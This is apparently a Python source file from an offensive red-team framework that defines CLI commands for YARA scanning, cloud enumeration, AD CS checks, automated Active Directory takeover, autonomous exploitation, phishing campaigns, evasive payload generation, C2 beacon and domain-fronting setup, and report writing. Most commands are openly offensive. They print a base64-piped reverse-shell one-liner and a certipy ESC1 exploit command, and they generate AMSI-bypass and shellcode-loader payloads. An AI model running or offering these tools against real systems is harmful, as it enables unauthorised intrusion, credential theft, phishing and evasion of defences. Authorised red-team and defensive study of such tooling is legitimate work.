"""Late-arriving commands not covered by the initial auto-migration batch.

These 10 commands were added to lazyown.py after
scripts/migrate_lazyown.py was last run.  They are staged here as a
PendingCommandSet so they can be activated when the originals are
deleted from lazyown.py.
"""

from __future__ import annotations

from cli.commands._dormancy import PendingCommandSet
from utils import (
    copy2clip,
    is_binary_present,
    json,
    os,
    print_error,
    print_msg,
    print_warn,
    sys,
)


class UnmigratedBatchCommandSet(PendingCommandSet):

    phase = "late"
    category = "miscellaneous_category"

    # ------------------------------------------------------------------
    # do_yara_scan  (post_exploitation_category)
    # ------------------------------------------------------------------
    def do_yara_scan(self, line):
        """Scan files or directories with YARA rules for malware/IOCs.

        Usage: yara_scan <target_path> [--download-rules]

        Scans the target path with default LazyOwn YARA rules covering
        webshells, Cobalt Strike, reverse shells, credential theft, and
        persistence mechanisms.  Auto-installs yara-python if missing.
        """
        args = line.strip().split()
        if not args:
            print_error("Usage: yara_scan <target_path> [--download-rules]")
            return

        target = args[0]
        download_rules = "--download-rules" in args

        if not os.path.exists(target):
            print_error(f"Target not found: {target}")
            return

        try:
            import yara  # noqa: F401
        except ImportError:
            print_msg("yara-python not found.  Installing...")
            self.cmd(f"{sys.executable} -m pip install yara-python --quiet")
            import yara  # noqa: F401, F811

        from modules.yara_scanner import YaraScanner, create_default_rules

        scanner = YaraScanner(auto_compile=False)

        if download_rules:
            print_msg("Downloading community YARA rules...")
            scanner.download_community_rules()

        print_msg("Compiling default YARA rules...")
        create_default_rules()
        scanner.compile_all()

        if scanner.rule_count == 0:
            print_error("No YARA rules loaded.")
            return

        print_msg(f"Scanning with {scanner.rule_count} rules...")

        if os.path.isfile(target):
            results = scanner.scan_file(target)
            if results:
                for match in results:
                    print_msg(f"  Rule: {match.get('rule', '?')}")
                    print_msg(f"  Tags: {match.get('tags', [])}")
                    if "meta" in match:
                        for k, v in match["meta"].items():
                            print_msg(f"  {k}: {v}")
                    print_msg("---")
            else:
                print_msg("No matches found.")
        else:
            results = scanner.scan_directory(target)
            for file_result in results:
                print_msg(f"\nFile: {file_result['file']}")
                print_msg(f"  SHA256: {file_result['sha256']}")
                for match in file_result.get("matches", []):
                    print_msg(f"  Rule: {match.get('rule', '?')}")
                    print_msg(f"  Tags: {match.get('tags', [])}")
            if not results:
                print_msg("No matches found.")

        print_msg(f"\nScanned {len(results)} matches across target.")

    # ------------------------------------------------------------------
    # do_cloud_enum  (scanning_category)
    # ------------------------------------------------------------------
    def do_cloud_enum(self, line):
        """Enumerate cloud provider metadata, storage, and IAM.

        Usage: cloud_enum [provider]
        Providers: aws, azure, gcp (auto-detect if omitted)

        Performs full enumeration including IMDS metadata extraction,
        storage bucket listing, IAM role enumeration, and privilege
        escalation path detection.  Auto-installs dependencies if missing.
        """
        provider = line.strip() or "auto"
        if provider not in ("aws", "azure", "gcp", "auto"):
            print_error("Provider must be: aws, azure, gcp, or auto")
            return

        try:
            import requests  # noqa: F401
        except ImportError:
            self.display_toastr("requests not found. Installing...", type="warning")
            self.cmd(f"{sys.executable} -m pip install requests --quiet")

        from modules.cloud_enum import CloudEnumerator

        enumerator = CloudEnumerator(provider=provider)
        detected = enumerator.detect_provider()
        print_msg(f"Detected provider: {detected or 'None'}")

        if not detected and provider == "auto":
            print_warn("No cloud provider detected. Are you on a cloud instance?")
            return

        print_msg("Enumerating metadata...")
        metadata = enumerator.enumerate_metadata()
        for key, value in metadata.items():
            if isinstance(value, dict):
                print_msg(f"  {key}:")
                for k, v in value.items():
                    if "token" in k.lower() or "key" in k.lower() or "secret" in k.lower():
                        v = str(v)[:30] + "...[redacted]"
                    print_msg(f"    {k}: {v}")
            else:
                if "token" in key.lower() or "key" in key.lower() or "secret" in key.lower():
                    value = str(value)[:30] + "...[redacted]"
                print_msg(f"  {key}: {value}")

        print_msg("Enumerating storage...")
        storage = enumerator.enumerate_storage()
        for bucket in storage:
            print_msg(f"  {bucket}")

        print_msg("Enumerating IAM...")
        iam = enumerator.enumerate_iam()
        for section, data in iam.items():
            print_msg(f"  {section}: {len(data) if isinstance(data, list) else 'present'}")

        print_msg("Enumeration complete.")

    # ------------------------------------------------------------------
    # do_adcs_check  (privilege_escalation_category)
    # ------------------------------------------------------------------
    def do_adcs_check(self, line):
        """Check Active Directory Certificate Services for ESC1-ESC8 vulnerabilities.

        Usage: adcs_check <username> <password> <domain> <dc_ip>

        Enumerates certificate templates and maps them to applicable
        ESC attack techniques. Uses Certipy under the hood.
        Auto-installs certipy-ad if missing.
        """
        args = line.strip().split()
        if len(args) < 4:
            print_error("Usage: adcs_check <username> <password> <domain> <dc_ip> [ntlm_hash]")
            return

        username = args[0]
        password = args[1]
        domain = args[2]
        dc_ip = args[3]
        hashes = args[4] if len(args) > 4 else None

        if not is_binary_present("certipy") and not is_binary_present("certipy-ad"):
            self.display_toastr("certipy-ad not found. Installing...", type="warning")
            self.cmd(f"{sys.executable} -m pip install certipy-ad --quiet")
            if not is_binary_present("certipy") and not is_binary_present("certipy-ad"):
                self.display_toastr("certipy-ad installation failed. Aborting.", type="error")
                return

        from modules.adcs_attacks import _ESC_DESCRIPTIONS, _ESC_EXPLOITATION, ADCSCertipyWrapper

        wrapper = ADCSCertipyWrapper()
        print_msg(f"Assessing AD CS for domain: {domain}")

        results = wrapper.assess_vulnerability(username, password, domain, dc_ip, hashes)

        total_vulnerabilities = 0
        for esc_id, vulns in sorted(results.items()):
            if vulns:
                total_vulnerabilities += len(vulns)
                print_msg(f"\n[{esc_id}] {_ESC_DESCRIPTIONS.get(esc_id, '')}")
                for vuln in vulns:
                    print_msg(f"  Template: {vuln.get('template_name', vuln.get('ca_name', '?'))}")
                    print_msg(f"  CA: {vuln.get('ca_name', '?')}")
                    exploitation = _ESC_EXPLOITATION.get(esc_id, "")
                    if exploitation:
                        print_msg(f"  Exploit: {exploitation}")
                if esc_id == "ESC1" and vulns:
                    print_msg("\n  Run exploit with:")
                    print_msg("  certipy req -u {u}@{d} -p '{p}' -dc-ip {dc} -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@{d}".format(  # noqa: E501
                        u=username, d=domain, p=password, dc=dc_ip))

        if total_vulnerabilities == 0:
            print_msg("No AD CS vulnerabilities detected.")
        else:
            print_msg(f"\nTotal vulnerable configurations: {total_vulnerabilities}")

    # ------------------------------------------------------------------
    # do_dominion  (lateral_movement_category)
    # ------------------------------------------------------------------
    def do_dominion(self, line):
        """Execute a fully automated Active Directory domain takeover.

        Runs the complete AD kill-chain: domain enumeration, user discovery,
        credential extraction (AS-REP roasting, Kerberoasting), lateral movement
        via PsExec/WMIExec/Pass-the-Hash, DCSync privilege escalation, and
        persistence mechanisms.

        Usage:
            dominion <domain> <dc_ip> [username] [password]
            dominion corp.local 10.10.11.5
            dominion corp.local 10.10.11.5 admin Password123!
            dominion corp.local 10.10.11.5 admin :ntlm_hash

        All credentials, sessions, and findings are persisted under
        ``sessions/``. Use ``creds`` to view captured credentials afterwards.

        :param line: Domain, DC IP, optional credentials.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        if len(parts) < 2:
            print_error("Usage: dominion <domain> <dc_ip> [username] [password]")
            return

        domain = parts[0]
        dc_ip = parts[1]
        username = parts[2] if len(parts) > 2 else ""
        password = parts[3] if len(parts) > 3 else ""
        ntlm_hash = parts[4] if len(parts) > 4 else ""

        try:
            from modules.domain_dominance import DomainDominance

            dd = DomainDominance()
            print_msg(f"Starting domain dominance operation against {domain} (DC: {dc_ip})")
            print_msg("Phases: domain_recon -> user_enum -> credential_extraction -> lateral_movement -> privilege_escalation -> persistence")  # noqa: E501
            result = dd.dominate(
                domain=domain,
                dc_ip=dc_ip,
                username=username,
                password=password,
                ntlm_hash=ntlm_hash,
            )
            print_msg(f"Dominance complete for {result.domain}")
            print_msg(f"  Compromised: {result.compromised}")
            print_msg(f"  Domain Admin obtained: {result.domain_admin_obtained}")
            print_msg(f"  DCSync performed: {result.dcsynced}")
            print_msg(f"  Users enumerated: {result.users_extracted}")
            print_msg(f"  Credentials stolen: {result.creds_stolen}")
            print_msg(f"  Sessions obtained: {result.sessions_obtained}")
            for phase, status in result.phase_results.items():
                print_msg(f"  Phase [{phase}]: {status}")
            if result.errors:
                for err in result.errors:
                    print_error(f"  Error: {err}")
            self.display_toastr(f"Domain {domain} dominated: {result.domain_admin_obtained}", type="success")
        except ImportError as exc:
            print_error(f"domain_dominance module not available: {exc}")
        except Exception as exc:
            print_error(f"Dominion operation failed: {exc}")

    # ------------------------------------------------------------------
    # do_hunt  (exploitation_category)
    # ------------------------------------------------------------------
    def do_hunt(self, line):
        """Run an autonomous exploitation chain against a target.

        Profiles the target's attack surface, ranks exploit candidates by
        confidence, and executes them in order until a shell is obtained or
        the exploit limit is reached. Adapts strategy based on results.

        The engine reads from ``sessions/world_model.json`` to understand
        what services, versions, and vulnerabilities exist. No re-scanning.

        Usage:
            hunt <target_ip> [max_exploits]
            hunt 10.10.11.5
            hunt 10.10.11.5 10

        :param line: Target IP and optional max exploit count.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        if not parts or not parts[0]:
            print_error("Usage: hunt <target_ip> [max_exploits]")
            return

        target = parts[0]
        max_exploits = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5

        try:
            from modules.autonomous_exploit_engine import AutonomousExploitEngine

            engine = AutonomousExploitEngine()
            print_msg(f"Profiling target: {target}")
            profile = engine.profile(target)
            print_msg(f"  OS: {profile.os_type} {profile.os_version}")
            print_msg(f"  Ports: {profile.open_ports}")
            print_msg(f"  Services: {len(profile.services)}")
            print_msg(f"  Credentials available: {len(profile.credentials)}")
            print_msg(f"  Access level: {profile.access_level}")

            print_msg("Ranking exploit candidates...")
            candidates = engine.rank_exploits(profile)
            candidates = candidates[:max_exploits]
            for i, c in enumerate(candidates):
                print_msg(f"  [{i + 1}] {c.service}:{c.product} {c.version} "
                          f"strategy={c.strategy} confidence={c.confidence:.2f} "
                          f"{'CVE-' + c.cve_id if c.cve_id else ''}")

            if not candidates:
                print_msg("No exploit candidates found.")
                return

            print_msg(f"Executing up to {max_exploits} exploits...")
            results = engine.hunt(target, max_exploits=max_exploits)

            for r in results:
                status = "SUCCESS" if r.success else "FAILED"
                shell = " [SHELL OBTAINED]" if r.shell_obtained else ""
                print_msg(f"  {status}: {r.candidate.service} "
                          f"({r.candidate.strategy}) in {r.duration_ms:.0f}ms{shell}")
                if r.shell_obtained:
                    print_msg(f"    Session: {r.session_id}")
                    self.display_toastr(f"Shell on {target} via {r.candidate.strategy}", type="success")
                if r.error:
                    print_error(f"    Error: {r.error}")

            successes = sum(1 for r in results if r.success)
            shells = sum(1 for r in results if r.shell_obtained)
            print_msg(f"Hunt complete: {successes}/{len(results)} successful, {shells} shells")
        except ImportError as exc:
            print_error(f"autonomous_exploit_engine module not available: {exc}")
        except Exception as exc:
            print_error(f"Hunt operation failed: {exc}")

    # ------------------------------------------------------------------
    # do_phisher  (command_and_control_category)
    # ------------------------------------------------------------------
    def do_phisher(self, line):
        """Launch a phishing campaign against a target domain.

        Profiles targets, generates email templates, clones landing pages,
        and tracks clicks and credential harvesting. Supports built-in
        templates (microsoft_365_login, sharepoint_share, password_reset,
        voicemail_notification, hr_policy_update) and custom templates.

        Modes:
            credential_harvest  - Clone login pages and collect credentials.
            payload_delivery    - Send weaponized attachments.
            callback_beacon     - Embed C2 callback URLs for initial access.

        Usage:
            phisher <domain> <template> [mode]
            phisher target.com microsoft_365_login
            phisher target.com password_reset credential_harvest
            phisher target.com custom_template.json

        Harvested credentials are saved to ``sessions/phishing_credentials.txt``.

        :param line: Domain, template name, and optional mode.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        if len(parts) < 2:
            print_error("Usage: phisher <domain> <template> [mode]")
            print_msg("Available templates: microsoft_365_login, sharepoint_share, password_reset, voicemail_notification, hr_policy_update")  # noqa: E501
            return

        target_domain = parts[0]
        template_name = parts[1]
        mode = parts[2] if len(parts) > 2 else "credential_harvest"

        try:
            from modules.phishing_orchestrator import PhishingOrchestrator

            phish = PhishingOrchestrator()
            print_msg(f"Launching phishing campaign against {target_domain}")
            print_msg(f"  Template: {template_name}")
            print_msg(f"  Mode: {mode}")

            targets = phish.profile_targets(target_domain)
            print_msg(f"  Targets profiled: {len(targets)}")
            for t in targets[:10]:
                print_msg(f"    {t.email} ({t.department})")

            campaign_id = phish.launch(
                target_domain=target_domain,
                template=template_name,
                mode=mode,
            )
            print_msg(f"Campaign launched: {campaign_id}")
            print_msg(f"Campaign data: sessions/phishing_{campaign_id}/")
            print_msg("Use the C2 dashboard to monitor clicks and credential captures.")
            self.display_toastr(f"Phishing campaign {campaign_id} launched against {target_domain}", type="info")
        except ImportError as exc:
            print_error(f"phishing_orchestrator module not available: {exc}")
        except Exception as exc:
            print_error(f"Phisher operation failed: {exc}")

    # ------------------------------------------------------------------
    # do_lazyreport  (reporting_category)
    # ------------------------------------------------------------------
    def do_lazyreport(self, line):
        """Generate a professional red team report from session data.

        Reads the world model, scan results, credentials, and session data
        from ``sessions/`` and produces a client-ready report in HTML, PDF,
        Markdown, or JSON format.

        Usage:
            lazyreport [format] [output_dir] [client_name]
            lazyreport
            lazyreport html reports/ AcmeCorp
            lazyreport md reports/ \"Client Inc\"
            lazyreport pdf

        Formats: html (default), pdf, md, json.
        Output: reports/lazyown_report_<timestamp>.<format>

        :param line: Format, output directory, and optional client name.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        fmt = parts[0] if parts else "html"
        output_dir = parts[1] if len(parts) > 1 else "reports"
        client = " ".join(parts[2:]) if len(parts) > 2 else ""

        if fmt not in ("html", "pdf", "md", "json"):
            print_error(f"Unsupported format: {fmt}. Use: html, pdf, md, json")
            return

        try:
            from modules.professional_report import RedTeamReportGenerator

            gen = RedTeamReportGenerator()
            print_msg("Collecting engagement data...")
            data = gen.collect_data()
            hosts = data.get("hosts", [])
            print_msg(f"  Hosts: {len(hosts)}")
            print_msg(f"  Credentials files: {len(data.get('credentials', []))}")
            print_msg(f"  Sessions: {len(data.get('sessions', []))}")
            print_msg(f"  Scan files: {len(data.get('scan_files', []))}")

            print_msg("Classifying findings...")
            findings = gen.classify_findings(data)
            print_msg(f"  Findings: {len(findings)}")
            for f in findings:
                print_msg(f"    [{f.severity.upper():8s}] {f.title}")

            print_msg(f"Generating {fmt.upper()} report...")
            report_path = gen.generate(
                output_dir=output_dir,
                output_format=fmt,
                client_name=client or "REDACTED",
            )
            if report_path:
                print_msg(f"Report generated: {report_path}")
                self.display_toastr(f"Report saved to {report_path}", type="success")
            else:
                print_error("Report generation failed.")
        except ImportError as exc:
            print_error(f"professional_report module not available: {exc}")
        except Exception as exc:
            print_error(f"Report generation failed: {exc}")

    # ------------------------------------------------------------------
    # do_evasive  (exploitation_category / misc)
    # ------------------------------------------------------------------
    def do_evasive(self, line: str) -> None:
        """Generate detection-evading payloads with multiple obfuscation strategies.

        Usage:
            evasive ps <raw_payload>   Obfuscate a PowerShell payload (AMSI bypass + encoding)
            evasive js <raw_payload>   Obfuscate a JavaScript payload
            evasive vba <raw_payload>  Obfuscate a VBA macro payload
            evasive rev <rhost> <rport> [python|bash|node]  Evasive reverse shell
            evasive sc <b64_shellcode> [early_bird|virtualalloc]  Shellcode loader
            evasive lolbas <payload_url> [technique]  LOLBAS execution
            evasive poly <command> [iterations]  Polymorphic command mutation
            evasive tech                 List all evasion techniques
        """
        from modules.evasive_payloads import EvasivePayloadGenerator

        gen = EvasivePayloadGenerator()
        parts = line.strip().split()
        if not parts:
            print_error("Usage: evasive <ps|js|vba|rev|sc|lolbas|poly|tech> [args...]")
            return

        subcmd = parts[0].lower()

        if subcmd == "ps":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a PowerShell payload to obfuscate.")
                return
            obf = gen.generate_powershell_obfuscated(raw, obfuscation_level=3)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "js":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a JavaScript payload to obfuscate.")
                return
            obf = gen.generate_javascript_obfuscated(raw)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "vba":
            raw = " ".join(parts[1:])
            if not raw:
                print_error("Provide a VBA macro to obfuscate.")
                return
            obf = gen.generate_vba_obfuscated(raw)
            print_msg(obf)
            copy2clip(obf)

        elif subcmd == "rev":
            rhost = parts[1] if len(parts) > 1 else self.params.get("rhost", "127.0.0.1")
            rport = int(parts[2]) if len(parts) > 2 else self.params.get("rport", 4444)
            technique = parts[3] if len(parts) > 3 else "python"
            b64 = gen.generate_linux_evasive(rhost, rport, technique)
            print_msg(f"echo {b64} | base64 -d | bash")
            copy2clip(b64)

        elif subcmd == "sc":
            sc_b64 = parts[1] if len(parts) > 1 else ""
            if not sc_b64:
                print_error("Provide base64-encoded shellcode.")
                return
            technique = parts[2] if len(parts) > 2 else "early_bird_apc"
            loader = gen.generate_shellcode_loader_powershell(sc_b64, technique)
            print_msg(loader)
            copy2clip(loader)

        elif subcmd == "lolbas":
            url = parts[1] if len(parts) > 1 else ""
            if not url:
                print_error("Provide a payload URL.")
                return
            technique = parts[2] if len(parts) > 2 else "mshta"
            cmd, desc = gen.generate_lolbas_execution(url, technique)
            print_msg(f"Technique: {desc}")
            print_msg(f"Command: {cmd}")
            copy2clip(cmd)

        elif subcmd == "poly":
            cmd = " ".join(parts[1:3]) if len(parts) > 1 else ""
            iterations = int(parts[3]) if len(parts) > 3 else 5
            if not cmd:
                print_error("Provide a command to obfuscate.")
                return
            poly = gen.generate_polymorphic_command(cmd, iterations)
            print_msg(poly)
            copy2clip(poly)

        elif subcmd == "tech":
            techs = gen.list_techniques()
            for category, items in techs.items():
                print_msg(f"\n{category}:")
                for item in items:
                    print_msg(f"  - {item}")

        else:
            print_error(f"Unknown subcommand: {subcmd}")

    # ------------------------------------------------------------------
    # do_chain  (exploitation_category)
    # ------------------------------------------------------------------
    def do_chain(self, line: str) -> None:
        """Run autonomous exploitation chain: recon -> vuln -> exploit -> post-exploit.

        Usage:
            chain [rhost] [nmap_xml_path]   Analyze target and generate exploit plan
            chain report                     Show last chain report

        If no rhost is given, uses the current rhost from payload.json.
        If no nmap_xml_path is given, auto-discovers all scan_*.nmap.xml in sessions/.
        """
        from modules.exploit_chain import ExploitChain

        parts = line.strip().split()

        if parts and parts[0] == "report":
            rhost = self.params.get("rhost", "127.0.0.1")
            report_path = f"sessions/exploit_chain_{rhost}.json"
            if os.path.exists(report_path):
                with open(report_path) as fh:
                    print_msg(json.dumps(json.load(fh), indent=2))
            else:
                print_error(f"No report found: {report_path}")
            return

        rhost = parts[0] if parts else self.params.get("rhost", "127.0.0.1")
        if rhost == "127.0.0.1" and not parts:
            print_msg("No target specified, using 127.0.0.1 (localhost)")

        nmap_path = parts[1] if len(parts) > 1 else f"sessions/scan_{rhost}.nmap"

        chain = ExploitChain(
            rhost=rhost,
            lhost=self.params.get("lhost", "127.0.0.1"),
            lport=self.params.get("lport", 4444),
            sessions_dir="sessions",
            nmap_xml_path=nmap_path if os.path.exists(nmap_path) else None,
        )

        services = chain.fingerprint_services()
        print_msg(f"XML files scanned: {len(chain._discover_xml_files())}")
        print_msg(f"Services discovered: {len(services)}")
        if not services:
            print_msg("  No open services found in nmap XML files.")
            print_msg("  Try running: lazynmap  or  lazyscan")
            return

        for svc in services:
            extra = ""
            if svc.product:
                extra += f" {svc.product}"
            if svc.version:
                extra += f" {svc.version}"
            print_msg(f"  {svc.port}/{svc.protocol} {svc.name}{extra}")

        vulns = chain.map_vulnerabilities()
        print_msg(f"\nVulnerabilities matched: {len(vulns)}")
        if not vulns:
            print_msg("  No known vulnerabilities matched for the discovered services.")
            pe = chain.get_post_exploit_commands("linux")
            print_msg(f"\nPost-exploitation modules: {', '.join(pe)}")
            chain.save_report()
            return

        for v in vulns:
            print_msg(f"  [{v.severity.upper():8s}] {v.cve_id} - {v.description} ({v.service.port}/{v.service.protocol})")  # noqa: E501
            if v.exploit_path:
                print_msg(f"    Exploit module: {v.exploit_path}")
            print_msg(f"    Confidence: {v.confidence:.0%}")
            for ref in v.references:
                print_msg(f"    Ref: {ref}")

        plan = chain.generate_exploit_plan()
        print_msg("\nExploitation Plan:")
        for step in plan:
            print_msg(f"  [{step['priority']}] {step['cve']} - {step['exploit_module']} => {step['expected_impact']}")

        pe = chain.get_post_exploit_commands("linux")
        print_msg(f"\nPost-exploitation modules: {', '.join(pe)}")

        saved = chain.save_report()
        print_msg(f"Report saved to {saved}")

    # ------------------------------------------------------------------
    # do_beaconcfg  (command_and_control_category)
    # ------------------------------------------------------------------
    def do_beaconcfg(self, line: str) -> None:
        """Generate a C2 beacon profile with traffic morphing and domain fronting.

        Usage:
            beaconcfg generate [name]        Generate a malleable C2 profile
            beaconcfg cdn [provider]         List CDN domains for fronting
            beaconcfg worker <c2_host> <c2_port> [token]  Generate Cloudflare Worker proxy
            beaconcfg dns <data> <domain>    Encode data as DNS tunnel queries
        """
        from modules.traffic_morpher import TrafficMorpher

        tm = TrafficMorpher()
        parts = line.strip().split()
        if not parts:
            print_error("Usage: beaconcfg <generate|cdn|worker|dns> [args...]")
            return

        subcmd = parts[0].lower()

        if subcmd == "generate":
            name = parts[1] if len(parts) > 1 else "default"
            protocol = parts[2] if len(parts) > 2 else "https"
            profile = tm.generate_beacon_profile(name=name, protocol=protocol)
            import json as _json

            print_msg(_json.dumps(profile, indent=2))
            path = f"sessions/beacon_profile_{name}.json"
            with open(path, "w") as fh:
                _json.dump(profile, fh, indent=2)
            print_msg(f"Profile saved to {path}")

        elif subcmd == "cdn":
            provider = parts[1] if len(parts) > 1 else "cloudflare"
            domains = tm.get_cdn_fronting_hosts(provider, count=5)
            print_msg(f"CDN fronting domains ({provider}):")
            for d in domains:
                print_msg(f"  {d}")

        elif subcmd == "worker":
            if len(parts) < 3:
                print_error("Usage: beaconcfg worker <c2_host> <c2_port> [auth_token]")
                return
            c2_host, c2_port = parts[1], int(parts[2])
            token = parts[3] if len(parts) > 3 else None
            code = tm.generate_cloudflare_worker_proxy_config(c2_host, c2_port, token)
            print_msg(code)
            path = f"sessions/cf_worker_{c2_host}.js"
            with open(path, "w") as fh:
                fh.write(code)
            print_msg(f"Worker code saved to {path}")
            print_msg("Deploy with: npx wrangler deploy")

        elif subcmd == "dns":
            if len(parts) < 2:
                print_error("Usage: beaconcfg dns <data> [domain]")
                return
            data = parts[1].encode()
            domain = parts[2] if len(parts) > 2 else "cdn.cloudflare.net"
            queries = tm.generate_dns_tunnel_payload(data, domain)
            for q in queries:
                print_msg(q)

        else:
            print_error(f"Unknown subcommand: {subcmd}")


__all__ = ["UnmigratedBatchCommandSet"]
